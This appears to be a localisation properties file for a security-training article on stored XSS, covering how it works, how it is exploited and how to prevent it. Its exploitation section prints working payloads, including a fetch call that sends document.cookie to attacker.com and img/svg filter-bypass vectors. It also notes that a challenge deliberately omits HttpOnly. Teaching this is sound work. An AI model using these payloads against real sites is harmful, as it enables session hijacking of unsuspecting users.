# Article related
article.title=Stored XSS
article.subtitle=Learn what Stored XSS is, how it works, \
  how to exploit it and how to prevent it.

article.introduction.title=What is Stored XSS?
article.introduction.text=<strong>Stored Cross-Site Scripting</strong> (Stored XSS) \
  is a persistent variant of the XSS vulnerability family. \
  Unlike reflected XSS - where the payload exists only in the URL and \
  affects only the requesting user - stored XSS embeds the malicious \
  script permanently into the application's database.<br><br> \
  Every subsequent visitor who loads the affected page executes \
  the attacker's script without any interaction beyond a normal page load. \
  Guestbooks, comment sections, user profiles, and forum posts \
  are the most common targets. A single successful injection \
  can affect thousands of users before it is discovered.

article.mechanism.title=How does it work?
article.mechanism.text=A vulnerable application accepts user input through \
  a form - a comment, a username, a message - and stores it in a database \
  without sanitization. When the page is later rendered, the application \
  retrieves the stored content and injects it directly into the HTML response.<br><br>\
  If the stored value contains `<script>alert(document.cookie)</script>`, \
  the browser receives and executes that script as if it were part of \
  the application's own code. The browser has no way to distinguish \
  between the application's legitimate scripts and the injected one - \
  both arrive in the same HTML document from the same origin, \
  so both execute with the same privileges.<br><br>\
  This is what makes stored XSS significantly more dangerous \
  than its reflected counterpart.

article.exploitation.title=How can it be exploited?
article.exploitation.text=The attacker submits a malicious payload \
  through any input field the application stores and later displays. \
  The simplest payload confirms the vulnerability:<br><br>\
  `<script>alert(document.cookie)</script>`. <br>\
  In real attacks, the payload exfiltrates session cookies to an \
  attacker-controlled server: <br><br>\
  `<script>fetch('https://attacker.com?c='+document.cookie)</script>`. <br>\
  Every user who loads the page after the payload is stored \
  becomes a victim - their session cookie is sent to the attacker, \
  who can then impersonate them without knowing their password. \
  More advanced payloads redirect victims to phishing pages, \
  log keystrokes, or modify the page's DOM to replace legitimate \
  content with fraudulent content.<br><br>\
  When a stored XSS payload affects an admin panel, \
  the attacker effectively gains administrative access \
  to the entire application.<br><br>\
  Alternative vectors bypass naive script-tag filters:<br>\
  `<img src=x onerror=alert(document.cookie)>` or<br>\
  `<svg onload=alert(document.cookie)>`<br> \
  execute without a `<script>` tag in sight.

article.defense.title=How can it be prevented?
article.defense.text=The primary defense is output encoding at render time - \
  every piece of stored user content inserted into HTML must have \
  special characters converted to their HTML entity equivalents \
  before being written into the response.<br><br> \
  The character `<` becomes `&lt;`, `>` becomes `&gt;`, \
  and `"` becomes `&quot;`. This ensures that even if the database \
  contains `<script>alert(1)</script>`, the browser renders it as \
  visible text rather than executing it.<br><br>\
  Input validation provides a secondary layer - reject or strip \
  content that contains HTML when plain text is expected. \
  A `Content-Security-Policy` header whitelists which scripts \
  the browser is permitted to execute, blocking inline scripts \
  even if injection succeeds: <br>\
  `Content-Security-Policy: script-src 'self'`.<br>\
  HttpOnly cookies prevent JavaScript from reading session cookies \
  entirely - `document.cookie` returns an empty string for cookies \
  marked HttpOnly, making cookie theft via XSS impossible \
  even when injection succeeds. <br>\
  This is why the VulnaRebel challenge deliberately omits HttpOnly \
  on its flag cookie - it is the defense that would stop the attack cold.

